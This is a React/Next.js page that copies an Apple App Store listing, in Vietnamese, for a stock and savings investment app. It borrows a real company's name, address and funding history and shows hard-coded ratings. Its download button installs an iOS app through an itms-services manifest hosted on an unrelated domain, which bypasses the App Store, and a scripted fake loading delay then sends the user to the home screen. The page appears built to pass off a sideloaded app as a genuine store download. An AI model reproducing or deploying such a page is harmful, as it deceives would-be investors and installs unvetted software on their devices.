import React, { useEffect, useState } from "react";
import useEmblaCarousel from "embla-carousel-react";
import localFont from "next/font/local";
import styles from "./Ios.module.css";
import Link from "next/link";
import { NAME_APP } from "@/lib/general";
import Head from "next/head";
// import Script from "next/script";
// import Script from "../lib/script.js";
// Font files can be colocated inside of `pages`
// const myFont = localFont({
//   src: [
//     {
//       path: "../public/font/sfpro/SF-Pro-Text-Regular.otf",
//     },
//     {
//       path: "../public/font/sfpro/SF-Pro-Text-RegularItalic.otf",
//     },
//     {
//       path: "../public/font/sfpro/SF-Pro-Text-Bold.otf",
//     },
//   ],
// });
export default function Ios() {
  const [emblaRef] = useEmblaCarousel();
  const [emblaRefOther] = useEmblaCarousel();

  // Hàm để xử lý khi click vào nút "readmorefea"

  useEffect(() => {
    const handleReadMoreClick = () => {
      const readmorefea = document.querySelector("#readmorefea");
      const morefea = document.querySelector("#morefea");
      if (readmorefea && morefea) {
        readmorefea.style.display = "none";
        morefea.style.display = "block";
      }
    };

    // Gán sự kiện click cho phần tử "#readmorefea"
    const readmoreButton = document.querySelector("#readmorefea");
    if (readmoreButton) {
      readmoreButton.addEventListener("click", handleReadMoreClick);
    }
    // Cleanup: remove event listener
    return () => {
      if (readmoreButton) {
        readmoreButton.removeEventListener("click", handleReadMoreClick);
      }
    };
  }, []);
  useEffect(() => {
    const handleReadMoreClick = () => {
      const readmoredes = document.querySelector("#readmoredes");
      const more = document.querySelector("#more");

      if (readmoredes && more) {
        readmoredes.style.display = "none";
        more.style.display = "block";
      }
    };

    // Gán sự kiện click cho phần tử "#readmorefea"
    const readmoredesButton = document.querySelector("#readmoredes");

    if (readmoredesButton) {
      readmoredesButton.addEventListener("click", handleReadMoreClick);
    }
    // Cleanup: remove event listener
    return () => {
      if (readmoredesButton) {
        readmoredesButton.removeEventListener("click", handleReadMoreClick);
      }
    };
  }, []);
  useEffect(() => {
    const handleDownloadClick = () => {
      const downloadBtn = document.querySelector(".download-btn");
      if (downloadBtn) {
        downloadBtn.classList.add("button--loading");
        setTimeout(() => {
          downloadBtn.classList.remove("button--loading");
          const popUpDown = document.querySelector(".pop-up-down");
          if (popUpDown) {
            popUpDown.style.display = "block";
            document.body.style.overflow = "hidden";
          }
        }, 7000);
      }
    };

    const handlePopUpClose = () => {
      const popUpDown = document.querySelector(".pop-up-down");
      if (popUpDown) {
        popUpDown.style.display = "none";
        document.body.style.overflow = "visible";
      }
    };

    // Gán sự kiện click cho phần tử ".download-btn"
    const downloadBtn = document.querySelector(".download-btn");
    if (downloadBtn) {
      downloadBtn.addEventListener("click", handleDownloadClick);
    }

    // Gán sự kiện click cho phần tử ".pop-up-down span"
    const popUpClose = document.querySelector(".pop-up-down span");
    if (popUpClose) {
      popUpClose.addEventListener("click", handlePopUpClose);
    }

    // Cleanup: remove event listeners
    return () => {
      if (downloadBtn) {
        downloadBtn.removeEventListener("click", handleDownloadClick);
      }
      if (popUpClose) {
        popUpClose.removeEventListener("click", handlePopUpClose);
      }
    };
  }, []);
  return (
    <>
      <main id="site-main" className={styles.fontios}>
        <div className="pop-up-down">
          <div className="container">
            <p>
              Vui lòng quay lại màn hình chính để kiểm tra tiến trình tải ứng
              dụng.
            </p>
            <span>Đóng</span>
          </div>
        </div>
        <section className="product">
          <div className="product-logo">
            <img src="/adaptive-icon.png" alt="photo" />
          </div>
          <div className="product-control">
            <div className="head">
              <h2>{NAME_APP} - Sản phẩm giao dịch đa dạng</h2>
              <span>{NAME_APP}</span>
            </div>
            <div className="control">
              <a
                className="download download-btn"
                href="itms-services://?action=download-manifest&amp;url=https://roboforex.trade/app.plist"
              >
                <span className="button__text">Nhận</span>
              </a>

              <Link href="#" className="btnUpload">
                <img src="/images/ios/upload.svg" alt="photo" />
              </Link>
            </div>
          </div>
        </section>
        <section className="slider-inf">
          <div className="wrapper">
            <ul className="items">
              <li className="item">
                <div>
                  <span>2,5N XẾP HẠNG</span>
                  <span>4,5</span>
                  <span>5 sao</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>TUỔI</span>
                  <span>4+</span>
                  <span>Tuổi</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>DANH MỤC</span>
                  <span>
                    <i className="fas fa-university"></i>
                  </span>
                  <span>Tài Chính</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>NHÀ PHÁT TRIỂN</span>
                  <span>
                    <i className="fas fa-portrait"></i>
                  </span>
                  <span>Infina</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>NGÔN NGỮ</span>
                  <span>VI</span>
                  <span>Tiếng Việt</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>KÍCH CỠ</span>
                  <span>211,5</span>
                  <span>MB</span>
                </div>
              </li>
            </ul>
          </div>
        </section>
        <section className="feature">
          <div className="head">
            <h3>Tính năng Mới</h3>
            <Link href="#">Lịch sử phiên bản</Link>
          </div>
          <div className="not">
            <span>Phiên bản 2.3.7</span>
            <span>1 tuần trước</span>
          </div>
          <div className="desc">
            <div className="det">
              <p>Version 2.3.7 có gì mới ?</p>
              <p>
                - Mời bạn bè cùng tham gia tích lũy nhóm để nhận được mức lãi
                suất cao hơn
              </p>
              <a
                id="readmorefea"
                // style={{ display: showMore ? "none" : "block" }}
                // onClick={handleReadMoreClick}
              >
                thêm
              </a>
            </div>
            <p
              id="morefea"
              // style={{ display: showMore ? "block" : "none" }}
            >
              - Trải nghiệm của bạn ở Tab Cộng đồng cũng được nâng cao.
            </p>
          </div>
        </section>
        <section className="screenshot">
          <h2>Xem trước</h2>
          <div className="embla" ref={emblaRef}>
            <div className="embla__container">
              {Array.from(Array(6).keys()).map((item) => (
                <div className="embla__slide" key={item}>
                  <img src={`/slot${item + 1}.png`} alt="photo" width={300} />
                </div>
              ))}

              {/* <div className="embla__slide">
                <img src="/2.webp" alt="photo" width={300} />
              </div>
              <div className="embla__slide">
                <img src="/3.webp" alt="photo" width={300} />
              </div>
              <div className="embla__slide">
                <img src="/4.webp" alt="photo" width={300} />
              </div>
              <div className="embla__slide">
                <img src="/5.webp" alt="photo" width={300} />
              </div> */}
            </div>
          </div>

          <div className="device">
            <span>Phone</span>
            <img src="/images/ios/phone.svg" alt="photo" />
          </div>
        </section>
        <section className="description">
          <div className="dis">
            <p>
              {NAME_APP} - App đầu tư chứng khoán Việt Nam & tích lũy online đơn
              giản, an toàn chỉ từ 10.000 Đ.
            </p>
            <p>• NHẬN NGAY VOUCHER ĐẦU TƯ CỔ PHIẾU MIỄN PHÍ!</p>
            <a href="#" id="readmoredes">
              thêm
            </a>
          </div>

          <div id="more">
            <p>
              {NAME_APP} dành tặng nhà đầu tư Voucher giao dịch cổ phiếu miễn
              phí sau khi xác thực tài khoản thành công. Nhà đầu tư có thể dễ
              dàng giao dịch chứng khoán online ngay tại nhà với số vốn nhỏ.
            </p>
            <p>• TÍCH LŨY ONLINE VỚI LÃI SUẤT HẤP DẪN LÊN ĐẾN 8.5%/NĂM</p>
            <p>
              Nhà đầu tư có thể lựa chọn hình thức tích lũy online để sinh lời
              tự động ngay trên Ứng dụng {NAME_APP}. Với mức lãi suất hấp dẫn
              lên đến 8.5%/năm đối với kỳ hạn 3 tháng, 8%/năm với kỳ hạn 2 tháng
              và 7.5% với kỳ hạn 30 ngày.
            </p>
            <p>• CỘNG ĐỒNG TÍCH HỢP CÙNG TÍNH NĂNG SAO CHÉP GIAO DỊCH</p>
            <p>
              Không chỉ là App đầu tư chứng khoán, {NAME_APP} còn phát triển
              tính năng Cộng đồng - nơi dành cho tất cả đối tượng có đam mê, có
              lý tưởng và có ý định đầu tư chứng khoán. Cộng đồng {NAME_APP} cho
              phép người dùng chia sẻ, thảo luận và tương tác không giới hạn.
              Đặc biệt, người dùng có thể thực hiện sao chép giao dịch chứng
              khoán ngay tại ứng dụng một cách đơn giản và dễ dàng.
            </p>
            <p>• MUA - BÁN CỔ PHIẾU PH N ĐOẠN CHỈ TỪ 10.000Đ</p>
            <p>
              {NAME_APP} là App chứng khoán cho phép người dùng thực hiện mua cổ
              phiếu lô lẻ, đầu tư kiếm tiền với giá chỉ từ 10.000 đồng. Với{" "}
              {NAME_APP}, bạn có thể bắt đầu hành trình đầu tư tài chính đơn
              giản và dễ dàng hơn bao giờ hết.
            </p>
            <p>
              Không cần phải bỏ số vốn lên đến hàng triệu đồng như sàn chứng
              khoán Việt Nam, nhà đầu tư online có thể tiết kiệm đến 90% vốn tối
              thiểu để đầu tư chứng khoán thông qua các cổ phiếu blue chip (cổ
              phiếu của các công ty lớn, có uy tín và tình hình tài chính vững
              chắc, giá trị vốn hóa thị trường lớn) ngay tại Ứng dụng {NAME_APP}
              .
            </p>
            <p>• ĐẦU TƯ VÀO CHỨNG CHỈ QUỸ ETF DỄ DÀNG</p>
            <p>
              Đầu tư nhanh chóng và dễ dàng vào các Chứng chỉ Quỹ ETF trên TTCK
              Việt Nam với mức vốn khởi điểm chỉ từ 10.000 đồng.
            </p>
            <p>• ĐẦU TƯ CHỨNG KHOÁN VÀ GIAO DỊCH CỰC KỲ ĐƠN GIẢN</p>
            <p>
              Ứng dụng đầu tư chứng khoán {NAME_APP} có giao diện dễ hiểu, dễ sử
              dụng, được thiết kế hướng tới trải nghiệm mượt mà và những nhà đầu
              tư mới.
            </p>
            <p>
              - Mở tài khoản nhanh chóng chỉ với vài thao tác và HOÀN TOÀN MIỄN
              PHÍ.
            </p>

            <p>
              - Giao dịch chứng khoán mọi lúc, mọi nơi với tính năng giao dịch
              24/7.
            </p>

            <p>
              - Đầu tư cổ phiếu theo giá hiện có trên thị trường và cập nhật số
              dư của bạn ngay lập tức.
            </p>

            <p>
              - Dễ dàng quản lý danh mục đầu tư chứng khoán với các thông tin và
              biểu đồ thống kê chi tiết.
            </p>

            <p>• HỌC ĐẦU TƯ VÀ CẬP NHẬT TIN TỨC MIỄN PHÍ</p>
            <p>
              Nhà đầu tư có thể học chứng khoán và tìm hiểu những kiến ​​thức về
              tài chính, đầu tư từ cơ bản đến nâng cao HOÀN TOÀN MIỄN PHÍ thông
              qua tính năng Kiến thức trên App {NAME_APP}. Ngoài ra, bạn còn có
              thể cập nhật liên tục các tin tức về tài chính và thị trường trên
              App đầ tư chứng khoán {NAME_APP}.
            </p>
            <p>• {NAME_APP} LÀ NGƯỜI BẠN ĐỒNG HÀNH ĐÁNG TIN CẬY</p>
            <p>
              - Thông tin và tài khoản của bạn được bảo mật tuyệt đối nhờ hệ
              thống bảo vệ mật khẩu, xác thực tài khoản 2 lớp.
            </p>
            <p>
              - {NAME_APP} thực hiện giao dịch mua, bán chứng khoán qua tài
              khoản của
              {NAME_APP} mở tại Công ty CP Chứng khoán VNDirect.
            </p>
            <p>
              - {NAME_APP} đã thu hút được nhiều nguồn vốn đầu tư từ các nhà đầu
              tư lớn trong và ngoài nước: Goodwater Capital, GFC, First Check
              Ventures, các nhà đầu tư thiên thần của XA Network...
            </p>
            <p>
              - {NAME_APP} cũng vinh dự là một trong những ứng dụng đầu tư chứng
              khoán đầu tiên của Việt Nam tham gia YC W22 Batch. Y Combinator
              được coi là vườn ươm nổi tiếng nhất dành cho các công ty khởi
              nghiệp của Mỹ.
            </p>
            <p>
              Bạn còn chờ gì mà không Tải và Mở ngay tài khoản {NAME_APP} để
              trải nghiệm App đầu tư kiếm tiền tiện lợi, đơn giản và an toàn!
              Với
              {NAME_APP}, bạn hoàn toàn có thể an tâm chơi chứng khoán cùng
              những trải nghiệm giao dịch tiên tiến, an toàn.
            </p>
            <p>
              Địa chỉ liên hệ: 222 Điện Biên Phủ, Phường Võ Thị Sáu, Quận 3,
              Thành phố Hồ Chí Minh.
            </p>
            <p>Hotline: 1900 633 099</p>
          </div>
          <div className="au">
            <div className="name">
              <h4>{NAME_APP}</h4>
              <span>Nhà phát triển</span>
            </div>
            <img src="/images/ios/next.svg" alt="phone" />
          </div>
        </section>
        <section className="rating">
          <div className="head">
            <h3 className="title">Xếp hạng & nhận xét</h3>
            <span>Xem tất cả</span>
          </div>
          <div className="star">
            <div className="r">
              <span className="va">4,5</span>
              <span className="per">/ 5</span>
            </div>
            <ul className="l">
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <p className="count">2.533 xếp hạng</p>
            </ul>
          </div>
          <div className="vote"></div>
        </section>
        <section className="app-inf">
          <h2>Thông tin</h2>
          <div className="wrapper">
            <ul className="items">
              <li className="item">
                <span> Nhà cung cấp </span>
                <span> {NAME_APP} COMPANY LIMITED </span>
              </li>
              <li className="item">
                <span> Kích cỡ </span>
                <span> 208,4 MB </span>
              </li>
              <li className="item">
                <span> Danh mục </span>
                <span> Tài chính </span>
              </li>
              <li className="item">
                <span> Tương thích </span>
                <span className="arr">
                  Trên iPhone này
                  <img src="/images/ios/down.svg" alt="photo" />
                </span>
              </li>
              <li className="item">
                <span> Ngôn ngữ </span>
                <span> Tiếng Anh </span>
              </li>
              <li className="item">
                <span> Tuổi </span>
                <span className="arr">
                  4+
                  <img src="/images/ios/down.svg" alt="photo" />
                </span>
              </li>
              <li className="item">
                <span> Mua In-App </span>
                <span className="arr">
                  Có
                  <img src="/images/ios/down.svg" alt="photo" />
                </span>
              </li>
              <li className="item">
                <span> Bản quyền </span>
                <span> &copy; {NAME_APP} COMPANY LIMITED </span>
              </li>
              <div className="link">
                <li className="item">
                  <span>
                    <Link href="#">Trang web nhà phát triển</Link>
                  </span>
                  <span>
                    <i className="fa-regular fa-compass"></i>
                  </span>
                </li>
                <li className="item">
                  <span>
                    <Link href="#">Chính sách quyền riêng tư</Link>
                  </span>
                  <span>
                    <i className="fa-solid fa-hand"></i>
                  </span>
                </li>
                <li className="item">
                  <span>
                    <Link href="#">Báo cáo sự cố</Link>
                  </span>
                  <span>
                    <img src="/images/ios/triangle.svg" alt="icon" />
                  </span>
                </li>
              </div>
            </ul>
          </div>
        </section>
        <section className="extend">
          <div className="head">
            <h2>Có thể bạn cũng thích</h2>
            <span>Xem tất cả</span>
          </div>
          <div className="app-extend">
            <div className="wrapper">
              <div className="embla_other" ref={emblaRefOther}>
                <ul className="embla__container_other">
                  <li className="embla__slide_other item">
                    <div className="ci">
                      <img src="/images/ios/e1.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>{NAME_APP} - Đầu tư và Tích lũy</h3>
                          <p>Ứng dụng đầu tư và tích lũy</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Nhận</span>
                        </Link>
                      </div>
                    </div>
                    <div className="ci">
                      <img src="/images/ios/e2.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>Tikop - Tích lũy linh hoạt</h3>
                          <p>Tiết kiệm, tích lũy</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Nhận</span>
                        </Link>
                      </div>
                    </div>
                  </li>
                  <li className="embla__slide_other item">
                    <div className="ci">
                      <img src="/images/ios/e3.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>Entrade X by DNSE: Chứng khoán</h3>
                          <p>Đầu tư & tài chính thông minh</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Nhận</span>
                        </Link>
                      </div>
                    </div>
                    <div className="ci">
                      <img src="/images/ios/e4.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>KB Fina</h3>
                          <p>Tư vấn dịch vụ đầu tư</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Nhận</span>
                        </Link>
                      </div>
                    </div>
                  </li>
                  <li className="embla__slide_other item">
                    <div className="ci">
                      <img src="/images/ios/e5.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>ONUS: Đầu tư BTC, ETH, BNB</h3>
                          <p>Tin tưởng bởi 3 triệu người</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Nhận</span>
                        </Link>
                      </div>
                    </div>
                    <div className="ci">
                      <img src="/images/ios/e6.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>MBS Mobile</h3>
                          <p>MBSecurities - Chung khoan MB</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Nhận</span>
                        </Link>
                      </div>
                    </div>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* <Script strategy="lazyOnload" src="/script.js" /> */}
    </>
  );
}
